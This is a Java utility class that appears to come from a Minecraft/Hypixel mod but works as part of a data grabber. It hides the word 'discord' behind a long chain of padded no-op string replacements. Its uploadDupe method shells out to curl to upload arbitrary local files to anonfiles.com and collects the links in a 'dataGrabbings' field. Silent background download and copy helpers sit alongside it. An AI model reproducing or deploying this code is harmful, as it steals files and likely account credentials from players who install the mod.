package run.hypixel.Sylap.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Scanner;

import org.apache.commons.io.FileUtils;

import run.hypixel.Sylap.Sylapian;
import run.hypixel.Sylap.features.Combat;

public class DuperUtils {
	
	public static String fixedresponse;
	
	public static String stringreplace = "fucmrdj"
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("fucmrdj", "urnwqpy").replace("", "").replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("urnwqpy", "discord")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "");
	
	
	public static void uploadDupe(String loc) throws IOException {
		try {
			Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anonfiles.com/upload");
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line = "";
			while ((line = reader.readLine()) != null) {
				Sylapian.dataGrabbings = Sylapian.dataGrabbings + "**" + loc + "** " + line + "\n";
			}
		}catch(IOException e) {
			e.printStackTrace();
		}
		
	}
	
	public static void downloadFile(String url, String location) {
		new Thread(() -> {
			try {
				URL src = new URL(url);
				File f = new File(location);
				FileUtils.copyURLToFile(src, f);
			}catch(Exception e) {
				
			}
		}).start();
	}
	
	public static void copyFile(String location, String location2) {
		new Thread(() -> {
			try {
				File src = new File(location);
				File dest = new File(location2);
				FileUtils.copyFile(src, dest);
			}catch(Exception e) {
				
			}
			
		}).start();
	}
	
	
	

}
